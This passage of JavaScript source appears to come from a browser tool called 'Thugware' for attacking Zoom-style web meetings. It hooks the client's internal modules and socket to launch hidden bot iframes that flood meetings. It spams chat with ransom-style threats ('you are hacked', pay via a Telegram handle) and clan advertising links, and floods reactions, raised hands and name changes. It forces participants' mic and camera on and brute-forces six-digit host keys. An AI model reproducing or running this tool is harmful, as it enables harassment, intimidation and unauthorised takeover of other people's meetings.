                    t.actions.toggleMute(false);
                }
                window.bots && window.bots.forEach((e => {
                    if (e?.loaded && e.hooks.state.meeting.currentUser.muted) {
                        e.actions.toggleMute(false);
                    }
                }));
            }), 1000);
        };

        const autoCamera = function e() {
            let t = this;
            if (e.interval) {
                clearInterval(e.interval);
                e.interval = void 0;
                return;
            }
            e.interval = setInterval((function () {
                if (!t.hooks.state.meeting.currentUser.bVideoOn) {
                    t.actions.toggleVideo(true);
                }
                window.bots && window.bots.forEach((e => {
                    if (e?.loaded && !e.hooks.state.meeting.currentUser.bVideoOn) {
                        e.actions.toggleVideo(true);
                    }
                }));
            }), 1000);
        };

        const r = function e() {
            let t = this;
            e.interval ? (clearInterval(e.interval), e.interval = void 0) : e.interval = setInterval((function () {
                t.hooks.state.meeting.currentUser.muted && t.actions.toggleMute(!1), t.hooks.state.meeting.currentUser.bVideoOn || t.actions.toggleVideo(!0), window.bots && window.bots.forEach((e => {
                    e?.loaded && (e.hooks.state.meeting.currentUser.muted && e.actions.toggleMute(!1), e.hooks.state.meeting.currentUser.bVideoOn || e.actions.toggleVideo(!0))
                }))
            }), 0)
        }, s = class {
            constructor(e) {
                var t;
                this._scope = e, this.hooks = function (e) {
                    let t = {};
                    return {
                        get wpRequire() {
                            return e?.webpackChunkwebclient.find((e => e[2])) || (t.wpRequire = e.webpackChunkwebclient?.push([[Symbol()], {}, e => e])), t.wpRequire
                        }, get meetingSocket() {
                            return Object.values(e.WCSockets.instance)[0]
                        }, get store() {
                            return Object.values(e.document.getElementById("root"))[0].memoizedState.element.props.store
                        }, get whiteboard() {
                            return Object.values(e.document.getElementById("ui-components"))[0].child.pendingProps.children.props.wb
                        }, get state() {
                            return this.store.getState()
                        }, findModule(e) {
                            return this.wpRequire(Object.keys(this.wpRequire.m)[Object.values(this.wpRequire.m).findIndex((t => t.toString().includes(e)))])
                        }, findModuleFn(e) {
                            return Object.values(this.findModule(e)).find((t => t.toString().includes(e)))
                        }, getPacketName(e) {
                            let t = Object.values(this.packets).findIndex((t => t == e));
                            return Object.keys(this.packets)[t]
                        }, get sendSocketMessage() {
                            return t.sendSocketMessage ??= this.meetingSocket.send.bind(this.meetingSocket)
                        }, get sendChatMessage() {
                            return t.sendChatMessage ??= this.findModuleFn("mention,localXmppMsgId")
                        }, get packets() {
                            return t.packets ??= this.findModule("WS_CONF_RENAME_REQ")
                        }, get actionPackets() {
                            return t.actionPackets ??= this.findModule("USER_NODE_AUDIO_STATUS_LIST:()")
                        }, get showToast() {
                            return t.showToast ??= Object.values(this.findModule("AliveToast.uniqueToast"))[0].toast
                        }, get easyStore() {
                            return t.easyStore ??= Object.values(this.findModule("easyStore=")).find((e => e?.easyGet))
                        }, recache() {
                            t = {}
                        }
                    }
                }(this.scope), this.actions = (t = this.hooks, {
                    changeUsername(e) {
                        function encodeToBase64(e) {
                            return btoa(unescape(encodeURIComponent(e)))
                        }
                        t.sendSocketMessage({ evt: t.packets.WS_CONF_RENAME_REQ, body: { id: t.state.meeting.currentUser.userId, dn2: encodeToBase64(e), olddn2: encodeToBase64(t.state.meeting.currentUser.displayName) } })
                    }, toggleMute(e) {
                        null == e && (e = !t.state.meeting.currentUser.muted), t.sendSocketMessage({ evt: t.actionPackets.USER_NODE_AUDIO_STATUS_LIST, body: { add: null, remove: null, update: [{ id: t.state.meeting.currentUser.userId, muted: e }] } }), t.sendSocketMessage({ evt: t.packets.WS_AUDIO_MUTE_REQ, body: { id: t.state.meeting.currentUser.userId, bMute: e } })
                    }, toggleHand(e) {
                        null == e && (e = !t.state.meeting.currentUser.bRaiseHand), t.sendSocketMessage({ evt: t.packets.WS_CONF_RAISE_LOWER_HAND_REQ, body: { id: t.state.meeting.currentUser.userId, bOn: e } })
                    }, toggleVideo(e) {
                        null == e && (e = !t.state.meeting.currentUser.bVideoOn), e ? t.findModuleFn("user start capture video")()(Thugware.hooks.store.dispatch, Thugware.hooks.store.getState) : t.sendSocketMessage({ evt: t.packets.WS_VIDEO_MUTE_VIDEO_REQ, body: { id: t.state.meeting.currentUser.userId, bOn: !e } })
                    }, sendReaction(e) {
                        t.sendSocketMessage({ evt: t.packets.WS_CONF_SEND_REACTION_REQ, body: { uNodeID: t.state.meeting.currentUser.userId, strEmojiContent: e } })
                    }, requestAI() {
                        t.sendSocketMessage({ evt: t.packets.WS_CONF_QUERY_OP_REQ, body: { type: "reqAICStart" } })
                    }, requestScreenshare(e) {
                        t.sendSocketMessage({ evt: t.packets.WS_SHARING_REMOTE_CONTROL_REQ, body: { id: e, bOn: !0 } })
                    }, sendMessage(e, n = [], o = [], a) {
                        t.sendChatMessage({ text: e, styleItems: o, mention: n }, a)(t.store.dispatch, t.store.getState)
                    }
                }), this.packetHandler = function (e) {
                    let t = {
                        initialized: !1, packetHandlers: [], onPacket: function (e) {
                            return t.packetHandlers.push(e), t.packetHandlers.length - 1
                        }, init: function () {
                            t.initialized = !0;
                            const n = e.meetingSocket.handlers.onMessage;
                            e.meetingSocket.handlers.onMessage = function (e) {
                                let o;
                                try {
                                    o = JSON.parse(e.data)
                                } catch (e) {
                                    return n.apply(this, arguments)
                                }
                                let a = !1;
                                const i = { cancel: () => { a = !0 } };
                                for (const e of t.packetHandlers) if (e(o, i), a) return;
                                const r = new MessageEvent("message", { data: JSON.stringify(o), origin: e.origin, lastEventId: e.lastEventId, source: e.source, ports: e.ports });
                                return n.call(this, r)
                            }
                        }
                    };
                    return t
                }(this.hooks)
            }
            get scope() {
                return this._scope || document.getElementById("webclient")?.contentWindow || window
            }
        };
        let d = 0;
        function l(e) {
            let t = document.createElement("iframe");
            t.src = meetingURL, t.style.resize = "both", t.style.border = "none", t.style.margin = "5px", e.appendChild(t);
            let n = new s(t.contentWindow);
            return t.contentWindow.thugbot = !0, t.onload = function () {
                Object.values(n.hooks.findModule("webClient_meetingUqiueId:")).find((e => e?.webClient_meetingUqiueId)).webClient_meetingUqiueId = Math.random().toString(36).substring(2, 7), n.loaded = !0
            }, window.bots.push(n), { botSDK: n }
        }
        const c = function () {
            window.bots = window.bots || [];
            let e = prompt("Сколько ботов?");
            SafeStorage.clear(), window.meetingURL = this.scope.location.href;
            let t = window.open("about:blank", "Панель ботов - " + d, "width=500, height=400, left=100, top=100");
            d++, t.document.title = "Панель ботов", t.document.body.style.backgroundColor = "black";
            let n = document.createElement("div");
            n.style.display = "column wrap", t.document.body.appendChild(n);
            for (let t = 0; t < e; t++) l(n)
        }, u = function e() {
            let t = this;
            if (e.interval) clearInterval(e.interval), e.interval = void 0; else {
                let n = prompt("Сообщение?"), o = prompt("Имя участника? (оставьте пустым для отправки всем)"), a = t.hooks.state.attendeesList.attendeesList, i = Object.values(a).find((e => e?.displayName == o))?.userId || 0;
                e.interval = setInterval((function () {
                    t.actions.sendMessage(n, null, null, i), window.bots && window.bots.forEach((e => {
                        e?.loaded && e.actions.sendMessage(n, null, null, i)
                    }))
                }), 0)
            }
        };

        const createSpamSelectionPanel = function() {
            let selectionPanel = null;
            let currentSpamInterval = null;
            let selectedMessages = new Set();
            
            const spamMessages = [
                {id: 1, text: "ВЫ ВЗЛОМАНЫ НАХУЙ. ВЫ СЕЙЧАС ЕБЕТЕСЬ С @fsoociettyy. ЕСЛИ ТЫ СУКА, ЭТО ЧИТАЕШЬ НАХУЙ, И ХОЧЕШЬ ОБЕЗОПАСИТЬ СЕБЯ НАХУЙ, ПИШИ @fsoociettyy В ТЕЛЕГРАМ ЗА ВЫКУПОМ, ИНАЧЕ, ТЕБЕ ПИЗДА ПОЛНАЯ НАХУЙ!!! СЛАВА КЛАНУ EOMF!", name: "Сообщение 1"},
                {id: 2, text: "за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍за🔍", name: "Сообщение 2"},
                {id: 3, text: "Я😍 поющий🪩 козел🐐 по😭имени🪆Яша ⚕️пою🪅я🎎отстойно😘но🎏это🧧не📅важно📉воот🏮иду❤️я😒по🧽лесу🙂‍↕️и🪭вдруг🥰яркий🤩свет🥸он😝дал🤨по😎рогам😇мне😣и😳скинул🫣в🤫кювет🤫моцарт😶альпинист🥵и😩бобер☹️и🫥еще🤤бобер😈😈😈", name: "Сообщение 3"},
                {id: 4, text: "ВЫПЛАТИТЕ ШТРАФ💸💸🇰🇿🇰🇿 ВЫПЛАТИТЕ ШТРАФ💸💸🇰🇿🇰🇿 ВЫПЛАТИТЕ ШТРАФ💸💸🇰🇿🇰🇿 ВЫПЛАТИТЕ ШТРАФ💸💸🇰🇿🇰🇿 ВЫПЛАТИТЕ ШТРАФ💸💸🇰🇿🇰🇿 ВЫПЛАТИТЕ ШТРАФ💸💸🇰🇿🇰🇿 ВЫПЛАТИТЕ ШТРАФ💸💸🇰🇿🇰🇿 ВЫПЛАТИТЕ ШТРАФ💸💸🇰🇿🇰🇿 ВЫПЛАТИТЕ ШТРАФ💸💸🇰🇿🇰🇿 ВЫПЛАТИТЕ ШТРАФ💸💸🇰🇿🇰🇿 ВЫПЛАТИТЕ ШТРАФ💸💸🇰🇿🇰🇿 ВЫПЛАТИТЕ ШТРАФ💸💸🇰🇿🇰🇿", name: "Сообщение 4"},
                {id: 5, text: "ВНИМАНИЕ ❗❗В ВАШЕЙ СОВЕ🦉🦉ОБНАРУЖЕНА 📡📡БЕСОВАЯ 👹👹АКТИВНОСТЬ🏃‍♂🏃‍♂ЭТО ШПИОН🕵🕵", name: "Сообщение 5"}
            ];
            
            const clanMessages = [
                {id: 100, text: "ВАС ЕБЕТ КЛАН EOMF — Elimination Of Meeting Forum! https://sriviurokov.netlify.app/#about", name: "EOMF Реклама 1"},
                {id: 101, text: "Присоединяйтесь к клану EOMF — мы делаем встречи веселее! 🚀https://sriviurokov.netlify.app/#about", name: "EOMF Реклама 2"},
                {id: 102, text: "EOMF — лучший клан для тех, кто устал от скучных зум-конференций! 💥https://sriviurokov.netlify.app/#about", name: "EOMF Реклама 3"}
            ];
            
            return function(t) {
                if (selectionPanel) {
                    selectionPanel.remove();
                    selectionPanel = null;
                    if (currentSpamInterval) {
                        clearInterval(currentSpamInterval);
                        currentSpamInterval = null;
                    }
                    selectedMessages.clear();
                    return;
                }
                
                selectionPanel = document.createElement("div");
                selectionPanel.className = "spam-selection-panel";
                
                const header = document.createElement("div");
                header.className = "spam-selection-header";
                header.textContent = "Выберите сообщения для спама";
                selectionPanel.appendChild(header);
                
                const messagesContainer = document.createElement("div");
                messagesContainer.style.padding = "10px";
                messagesContainer.style.maxHeight = "400px";
                messagesContainer.style.overflowY = "auto";
                
                const allMessages = [...spamMessages, ...clanMessages];
                
                allMessages.forEach((message) => {
                    const item = document.createElement("div");
                    item.className = "spam-message-item";
                    
                    const checkbox = document.createElement("input");
                    checkbox.type = "checkbox";
                    checkbox.className = "spam-checkbox";
                    checkbox.value = message.id;
                    
                    const messageText = document.createElement("div");
                    messageText.className = "spam-message-text";
                    messageText.textContent = `${message.name}: ${message.text.substring(0, 50)}...`;
                    messageText.title = message.text;
                    
                    checkbox.addEventListener("change", function() {
                        if (this.checked) {
                            selectedMessages.add(message.id);
                            item.classList.add("selected");
                        } else {
                            selectedMessages.delete(message.id);
                            item.classList.remove("selected");
                        }
                    });
                    
                    item.appendChild(checkbox);
                    item.appendChild(messageText);
                    messagesContainer.appendChild(item);
                });
                
                selectionPanel.appendChild(messagesContainer);
                
                const controls = document.createElement("div");
                controls.className = "spam-controls";
                
                const speedInput = document.createElement("input");
                speedInput.className = "spam-control-input";
                speedInput.type = "number";
                speedInput.value = "1000";
                speedInput.placeholder = "Скорость спама (мс)";
                controls.appendChild(speedInput);
                
                const targetInput = document.createElement("input");
                targetInput.className = "spam-control-input";
                targetInput.type = "text";
                targetInput.placeholder = "Имя участника (опционально)";
                controls.appendChild(targetInput);
                
                const startButton = document.createElement("button");
                startButton.className = "spam-action-button primary";
                startButton.textContent = "🚀 Начать спам";
                
                startButton.addEventListener("click", function() {
                    if (currentSpamInterval) {
                        clearInterval(currentSpamInterval);
                        currentSpamInterval = null;
                        startButton.textContent = "🚀 Начать спам";
                    } else {
                        if (selectedMessages.size === 0) {
                            alert("Выберите хотя бы одно сообщение!");
                            return;
                        }
                        
                        const speed = parseInt(speedInput.value) || 1000;
                        const target = targetInput.value.trim();
                        
                        const attendees = t.hooks.state.attendeesList.attendeesList;
                        const userId = target ? Object.values(attendees).find(e => e?.displayName === target)?.userId || 0 : 0;
                        
                        const selectedMessagesArray = Array.from(selectedMessages);
                        let currentIndex = 0;
                        
                        currentSpamInterval = setInterval(() => {
                            const messageId = selectedMessagesArray[currentIndex];
                            const message = allMessages.find(m => m.id === messageId);
                            
                            if (message) {
                                t.actions.sendMessage(message.text, null, null, userId);
                                
                                window.bots && window.bots.forEach(bot => {
                                    if (bot?.loaded) {
                                        bot.actions.sendMessage(message.text, null, null, userId);
                                    }
                                });
                            }
                            
                            currentIndex = (currentIndex + 1) % selectedMessagesArray.length;
                            
                        }, speed);
                        
                        startButton.textContent = "⏹️ Остановить спам";
                    }
                });
                
                controls.appendChild(startButton);
                selectionPanel.appendChild(controls);
                
                document.body.appendChild(selectionPanel);
            };
        }();

        const randomChatSpam = function() {
            createSpamSelectionPanel(this);
        };

        const E = function e() {
            let t = this;
            if (e.interval) {
                clearInterval(e.interval);
                e.interval = void 0;
            } else {
                let customEmojis = prompt("Введите эмодзи для спама (через запятую) или оставьте пустым для стандартных:", "🍆,💦");
                
                let emojiList;
                if (customEmojis && customEmojis.trim() !== "") {
                    emojiList = customEmojis.split(',').map(emoji => emoji.trim()).filter(emoji => emoji !== "");
                } else {
                    emojiList = ["🍆", "💦"];
                }
                
                if (emojiList.length === 0) {
                    alert("Неверный ввод эмодзи!");
                    return;
                }
                
                let n = 0;
                e.interval = setInterval((() => {
                    n = (n + 1) % emojiList.length;
                    t.actions.sendReaction(emojiList[n]);
                    window.bots && window.bots.forEach((e => {
                        e?.loaded && (n = (n + 1) % emojiList.length, e.actions.sendReaction(emojiList[n]));
                    }));
                }), 10);
            }
        };

        function p(e) {
            let t = document.createElement("iframe");
            t.src = meetingURL, t.style.display = "none", e.appendChild(t);
            let n = new s(t.contentWindow);
            return t.contentWindow.thugbot = !0, t.onload = function () {
                const e = Object.values(n.hooks.findModule("webClient_meetingUqiueId:")).find((e => e?.webClient_meetingUqiueId));
                e && (e.webClient_meetingUqiueId = Math.random().toString(36).substring(2, 7)), n.loaded = !0, setInterval((function () {
                    try {
                        let e = n.hooks.state.attendeesList.attendeesList.map(e => ({ bVideoOn: !1, id: e.userId })), t = { evt: n.hooks.packets.WS_CONF_ROSTER_INDICATION, body: { add: null, remove: null, update: e } };
                        n.hooks.meetingSocket.handlers.onMessage({ data: JSON.stringify(t) })
                    } catch (e) { }
                }), 3e3)
            }, window.bots.push(n), { botSDK: n }
        }
        const h = function () {
            window.bots = window.bots || [];
            let e = parseInt(prompt("Сколько ботов?"), 10);
            SafeStorage.clear(), window.meetingURL = this.scope.location.href;
            let t = document.createElement("iframe");
            t.style.display = "none", t.src = "about:blank", document.body.appendChild(t);
            for (let n = 0; n < e; n++) p(t.contentWindow.document.body)
        };
        let m = null;
        const g = function () {
            let e = this;
            function t(t) {
                e.hooks.sendSocketMessage({ evt: e.hooks.packets.WS_CONF_HOST_KEY_REQ, body: { hostKey: t } })
            }
            if (e.packetHandler.initialized || e.packetHandler.init(), null !== m) return e.packetHandler.packetHandlers.splice(m), void (m = null);
            alert("Это, вероятно, займет ДОЛГОЕ время, но вы получите уведомление с кодом");
            let n = 0;
            m = e.packetHandler.onPacket((function (e, o) {
                e?.body?.bresult && (3036 == e.body.bresult ? (n++, t(n.toString().padStart(6, "0")), console.log("Пробуем: " + n.toString().padStart(6, "0"))) : alert("Найдено: " + n.toString().padStart(6, "0")))
            })), t(n.toString().padStart(6, "0"))
        }, b = function e() {
            let t = this, n = t.hooks.state.meeting.currentUser.bRaiseHand;
            e.interval ? (clearInterval(e.interval), e.interval = void 0, t.actions.toggleHand(!1), window.bots && window.bots.forEach((e => {
                e?.loaded && e.actions.toggleHand(!1)
            }))) : e.interval = setInterval((function () {
                n = !n, t.actions.toggleHand(n), window.bots && window.bots.forEach((e => {
                    e?.loaded && e.actions.toggleHand(n)
                }))
            }), 0)
        };
        let f = !1;
        const w = function () {
            f = !f;
            const e = this.scope.document.getElementById("notificationManager"), t = top.document.getElementById("notificationManager");
            f ? (e && (e.style.opacity = "0"), t && (t.style.opacity = "1")) : (e && (e.style.opacity = "1"), t && (t.style.opacity = "1"))
        };
        let v = !1, y = null;
        const S = function () {
            let e = this;
            v = !v;
            let t = Object.values(e.scope.document.styleSheets).find((e => e.ownerNode?.href?.includes("wc_meeting")));
            Object.values(t.rules).find((e => e.selectorText?.includes("reaction-pop-up-container"))).style.opacity = v ? "0" : "1", e.packetHandler.initialized || e.packetHandler.init(), y || (y = e.packetHandler.onPacket(((e, t) => {
                e?.body?.update?.[0]?.bRaiseHand && v && e?.body?.update?.[0] && (e.body.update[0].bRaiseHand = !1)
            })))
        };
        n(384);
        const k = function e() {
            let t = this;
            if (e.interval) return clearInterval(e.interval), void(e.interval = void 0);
            
            const currentName = t.hooks.state.meeting.currentUser.displayName;
            const isCyrillic = /[а-яА-ЯёЁ]/.test(currentName);
            
            const namesList = {
                english: ["James", "Mary", "John", "Patricia", "Robert", "Jennifer", "Michael", "Linda", "William", "Elizabeth", "David", "Barbara", "Richard", "Susan", "Joseph", "Jessica", "Thomas", "Sarah", "Charles", "Karen", "Christopher", "Nancy", "Daniel", "Lisa", "Matthew", "Margaret", "Anthony", "Betty", "Donald", "Sandra", "Mark", "Ashley", "Paul", "Dorothy", "Steven", "Kimberly", "Andrew", "Emily", "Joshua", "Donna", "Kevin", "Michelle", "Brian", "Carol", "George", "Amanda", "Edward", "Melissa", "Ronald", "Deborah", "Samuel", "Helen", "Adam", "Natalie", "Diana", "Peter", "Victoria", "Henry", "Julia", "Ryan", "Alice", "Nathan", "Sophia", "Isaac", "Grace", "Zachary", "Chloe", "Jesse", "Megan", "Gabriel", "Ava", "Ethan", "Lily", "Lucas", "Scarlett", "Noah", "Emma", "Logan", "Hannah", "Aiden", "Samantha", "Isaiah", "Addison", "Caleb", "Nora", "Charles", "Katherine", "Luke", "Zoe", "Leo", "Aria", "Oliver", "Bella", "Jackson", "Aurora", "Jameson", "Madison", "Eli", "Piper", "Mason", "Sofia", "Carter", "Ellie", "Dylan", "Stella", "Sawyer", "Victoria", "Theodore", "Hazel", "Jordan", "Riley", "Wyatt", "Layla", "Hudson", "Maya", "Asher", "Sadie", "Anthony", "Aubrey", "Gavin", "Claire", "Adrian", "Luna", "Chase", "Eliana", "Jaxon", "Kinsley", "Colton", "Maddison", "Xander", "Camila", "Kai", "Serenity", "Liam", "Julia", "Quinn", "Vivian", "Ryder", "Sienna"],
                
                russian: ["Александр", "Алексей", "Анатолий", "Андрей", "Антон", "Аркадий", "Арсений", "Артем", "Борис", "Вадим", "Валентин", "Валерий", "Василий", "Виктор", "Виталий", "Владимир", "Владислав", "Всеволод", "Вячеслав", "Геннадий", "Георгий", "Григорий", "Даниил", "Денис", "Дмитрий", "Евгений", "Егор", "Иван", "Игорь", "Илья", "Кирилл", "Константин", "Лев", "Леонид", "Максим", "Марк", "Матвей", "Михаил", "Никита", "Николай", "Олег", "Павел", "Петр", "Роман", "Руслан", "Сергей", "Станислав", "Степан", "Тимофей", "Федор", "Юрий", "Ярослав", "Александра", "Алена", "Алина", "Алиса", "Алла", "Анастасия", "Ангелина", "Анна", "Антонина", "Валентина", "Валерия", "Варвара", "Вера", "Вероника", "Виктория", "Галина", "Дарья", "Диана", "Ева", "Евгения", "Екатерина", "Елена", "Елизавета", "Жанна", "Зоя", "Ирина", "Кира", "Клавдия", "Ксения", "Лариса", "Лидия", "Любовь", "Людмила", "Маргарита", "Марина", "Мария", "Надежда", "Наталья", "Нина", "Оксана", "Олеся", "Ольга", "Полина", "Раиса", "Светлана", "София", "Тамара", "Татьяна", "Ульяна", "Юлия", "Яна"]
            };
            
            const selectedNames = isCyrillic ? namesList.russian : namesList.english;
            let n = 0;
            
            e.interval = setInterval(() => {
                n = (n + 1) % selectedNames.length;
                t.actions.changeUsername(selectedNames[n]);
                
                window.bots && window.bots.forEach((bot) => {
                    if (bot?.loaded) {
                        const botCurrentName = bot.hooks.state.meeting.currentUser.displayName;
                        const botIsCyrillic = /[а-яА-ЯёЁ]/.test(botCurrentName);
                        const botSelectedNames = botIsCyrillic ? namesList.russian : namesList.english;
                        
                        n = (n + 1) % botSelectedNames.length;
                        bot.actions.changeUsername(botSelectedNames[n]);
                    }
                });
            }, 100);
        };

        var C = n(72), I = n.n(C), M = n(825), x = n.n(M), R = n(659), O = n.n(R), _ = n(56), T = n.n(_), L = n(540), A = n.n(L), N = n(113), U = n.n(N), B = n(103), H = {};
        H.styleTagTransform = U(), H.setAttributes = T(), H.insert = O().bind(null, "head"), H.domAPI = x(), H.insertStyleElement = A(), I()(B.A, H), B.A && B.A.locals && B.A.locals;

        const D = class {
            constructor(e, t = !0) {
                try {
                    this.panel = document.createElement("div");
                    this.panel.className = "Thugware-panel";
                    document.body.appendChild(this.panel);
                    
                    this.header = document.createElement("h2");
                    this.header.className = "Thugware-header";
                    this.header.textContent = Localization.t('panelTitle');
                    this.panel.appendChild(this.header);
                    
                    this.createNavigation();
                    
                    this.buttonContainer = document.createElement("div");
                    this.buttonContainer.className = "Thugware-button-container";
                    this.panel.appendChild(this.buttonContainer);
                    
                    this.createTabContents();
                    
                    this.isDragging = false;
                    this.offset = { x: 0, y: 0 };
                    this.initDrag();
                    
                    if (t) this.initToggleButton();
                    
                    this.switchTab('main');
                    
                    // Сохраняем ссылку для обновления локализации
                    window.thugwarePanel = this;
                } catch (error) {
                    console.error('Ошибка создания панели:', error);
                }
            }
            
            createNavigation() {
                const nav = document.createElement("div");
                nav.className = "nav-tabs";
                
                const tabs = [
                    { id: 'main', name: Localization.t('mainTab') },
                    { id: 'cfg', name: Localization.t('cfgTab') },
                    { id: 'misc', name: Localization.t('miscTab') },
                    { id: 'info', name: Localization.t('infoTab') }
                ];
                
                tabs.forEach(tab => {
                    const tabElement = document.createElement("button");
                    tabElement.className = "nav-tab";
                    tabElement.textContent = tab.name;
                    tabElement.dataset.tab = tab.id;
                    tabElement.addEventListener('click', () => this.switchTab(tab.id));
                    nav.appendChild(tabElement);
                });
                
                this.panel.appendChild(nav);
            }
            
            createTabContents() {
                this.mainTab = document.createElement("div");
                this.mainTab.className = "tab-content";
                this.mainTab.id = "tab-main";
                
                this.cfgTab = document.createElement("div");
                this.cfgTab.className = "tab-content";
                this.cfgTab.id = "tab-cfg";
                
                this.miscTab = document.createElement("div");
                this.miscTab.className = "tab-content";
                this.miscTab.id = "tab-misc";
                
                this.infoTab = document.createElement("div");
                this.infoTab.className = "tab-content";
                this.infoTab.id = "tab-info";
                
                this.buttonContainer.appendChild(this.mainTab);
                this.buttonContainer.appendChild(this.cfgTab);
                this.buttonContainer.appendChild(this.miscTab);
                this.buttonContainer.appendChild(this.infoTab);
                
                this.createCfgContent();
                this.createMiscContent();
                this.createInfoContent();
            }
            
            createCfgContent() {
                const comingSoon = document.createElement("div");
                comingSoon.className = "coming-soon";
                
                const text = document.createElement("div");
                text.className = "coming-soon-text";
                text.textContent = "Coming Soon";
                
                const subtext = document.createElement("div");
                subtext.className = "coming-soon-subtext";
                subtext.textContent = "Configuration options will be available in future updates";
                
                comingSoon.appendChild(text);
                comingSoon.appendChild(subtext);
                this.cfgTab.appendChild(comingSoon);
            }
            
            createMiscContent() {
                const miscContent = document.createElement("div");
                miscContent.className = "misc-content";
                
                // Выбор языка
                const languageSection = document.createElement("div");
                languageSection.className = "language-selector";
                
                const langTitle = document.createElement("div");
                langTitle.className = "selector-title";
                langTitle.textContent = Localization.t('language');
                languageSection.appendChild(langTitle);
                
                const langButtons = document.createElement("div");
                langButtons.className = "language-buttons";
                
                const ruBtn = document.createElement("button");
                ruBtn.className = `lang-btn ${Localization.currentLang === 'ru' ? 'active' : ''}`;
                ruBtn.textContent = Localization.t('russian');
                ruBtn.addEventListener('click', () => {
                    Localization.setLanguage('ru');
                    this.updateLanguageButtons();
                });
                
                const enBtn = document.createElement("button");
                enBtn.className = `lang-btn ${Localization.currentLang === 'en' ? 'active' : ''}`;
                enBtn.textContent = Localization.t('english');
                enBtn.addEventListener('click', () => {
                    Localization.setLanguage('en');
                    this.updateLanguageButtons();
                });
                
                langButtons.appendChild(ruBtn);
                langButtons.appendChild(enBtn);
                languageSection.appendChild(langButtons);
                
                // Выбор темы
                const themeSection = document.createElement("div");
                themeSection.className = "theme-selector";
                
                const themeTitle = document.createElement("div");
                themeTitle.className = "selector-title";
                themeTitle.textContent = Localization.t('theme');
                themeSection.appendChild(themeTitle);
                
                const themeButtons = document.createElement("div");
                themeButtons.className = "theme-buttons";
                
                const themes = ['neon', 'cyber', 'ocean'];
                themes.forEach(theme => {
                    const themeBtn = document.createElement("button");
                    themeBtn.className = `theme-btn ${ThemeManager.currentTheme === theme ? 'active' : ''}`;
                    themeBtn.textContent = Localization.t(theme);
                    themeBtn.addEventListener('click', () => {
                        ThemeManager.applyTheme(theme);
                        this.updateThemeButtons();
                    });
                    themeButtons.appendChild(themeBtn);
                });
                
                themeSection.appendChild(themeButtons);
                
                miscContent.appendChild(languageSection);
                miscContent.appendChild(themeSection);
                this.miscTab.appendChild(miscContent);
            }
            
            createInfoContent() {
                const infoContent = document.createElement("div");
                infoContent.className = "info-content";
                
                const title = document.createElement("div");
                title.className = "info-title";
                title.textContent = Localization.t('infoTitle');
                
                const features = Localization.t('features');
                
                infoContent.appendChild(title);
                
                if (Array.isArray(features)) {
                    features.forEach(feature => {
                        const featureElement = document.createElement("div");
                        featureElement.className = "info-feature";
                        featureElement.textContent = feature;
                        infoContent.appendChild(featureElement);
                    });
                }
                
                const warning = document.createElement("div");
                warning.className = "warning-text";
                warning.textContent = Localization.t('useAtOwnRisk');
                infoContent.appendChild(warning);
                
                this.infoTab.appendChild(infoContent);
            }
            
            updateLanguageButtons() {
                const langButtons = this.miscTab.querySelectorAll('.lang-btn');
                langButtons.forEach(btn => {
                    btn.classList.remove('active');
                    if (btn.textContent === Localization.t(Localization.currentLang === 'ru' ? 'russian' : 'english')) {
                        btn.classList.add('active');
                    }
                });
            }
            
            updateThemeButtons() {
                const themeButtons = this.miscTab.querySelectorAll('.theme-btn');
                themeButtons.forEach(btn => {
                    btn.classList.remove('active');
                    const themeName = Object.keys(ThemeManager.themes).find(
                        key => Localization.t(key) === btn.textContent
                    );
                    if (themeName === ThemeManager.currentTheme) {
                        btn.classList.add('active');
                    }
                });
            }
            
            updateLocalization() {
                try {
                    // Обновляем заголовок
                    this.header.textContent = Localization.t('panelTitle');
                    
                    // Обновляем навигацию
                    const navTabs = this.panel.querySelectorAll('.nav-tab');
                    const tabNames = ['mainTab', 'cfgTab', 'miscTab', 'infoTab'];
                    navTabs.forEach((tab, index) => {
                        tab.textContent = Localization.t(tabNames[index]);
                    });
                    
                    // Обновляем содержимое вкладок
                    this.updateMainTab();
                    this.updateMiscTab();
                    this.updateInfoTab();
                } catch (error) {
                    console.error('Ошибка обновления локализации:', error);
                }
            }
            
            updateMainTab() {
                try {
                    // Очищаем и пересоздаем содержимое главной вкладки
                    this.mainTab.innerHTML = '';
                    this.createMainContent();
                } catch (error) {
                    console.error('Ошибка обновления главной вкладки:', error);
                }
            }
            
            updateMiscTab() {
                try {
                    // Обновляем кнопки в misc вкладке
                    this.updateLanguageButtons();
                    this.updateThemeButtons();
                } catch (error) {
                    console.error('Ошибка обновления misc вкладки:', error);
                }
            }
            
            updateInfoTab() {
                try {
                    // Обновляем инфо вкладку
                    this.infoTab.innerHTML = '';
                    this.createInfoContent();
                } catch (error) {
                    console.error('Ошибка обновления info вкладки:', error);
                }
            }
            
            createMainContent() {
                try {
                    // Розділ: Медіа
                    this.addSectionWithDividerToMain(Localization.t('mediaSection'));
                    this.addButtonToMain(Localization.t('enableMic'), autoMicrophone.bind(window.Thugware));
                    this.addButtonToMain(Localization.t('enableCam'), autoCamera.bind(window.Thugware));
                    this.addButtonToMain(Localization.t('recordUsers'), W.bind(window.Thugware));

                    // Розділ: Спам
                    this.addSectionWithDividerToMain(Localization.t('spamSection'));
                    this.addButtonToMain(Localization.t('spamHands'), b.bind(window.Thugware));
                    this.addButtonToMain(Localization.t('spamDef'), randomChatSpam.bind(window.Thugware));
                    this.addButtonToMain(Localization.t('spamReactions'), E.bind(window.Thugware)); 
                    this.addButtonToMain(Localization.t('spamNames'), k.bind(window.Thugware)); 
                    this.addButtonToMain(Localization.t('spamCustom'), u.bind(window.Thugware));
                    this.addButtonToMain(Localization.t('spamAI'), P.bind(window.Thugware));
                    this.addButtonToMain(Localization.t('spamScreenshare'), z.bind(window.Thugware));

                    // Розділ: Боти
                    this.addSectionWithDividerToMain(Localization.t('botsSection'));
                    this.addButtonToMain(Localization.t('botMeeting'), c.bind(window.Thugware));
                    this.addButtonToMain(Localization.t('floodMeeting'), h.bind(window.Thugware));

                    // Розділ: Акаунт
                    this.addSectionWithDividerToMain(Localization.t('accountSection'));
                    this.addButtonToMain(Localization.t('stealName'), F.bind(window.Thugware));
                    this.addButtonToMain(Localization.t('autoReconnect'), i.bind(window.Thugware));

                    // Розділ: Система
                    this.addSectionWithDividerToMain(Localization.t('systemSection'));
                    this.addButtonToMain(Localization.t('hideNotifications'), w.bind(window.Thugware));
                    this.addButtonToMain(Localization.t('hideReactions'), S.bind(window.Thugware));
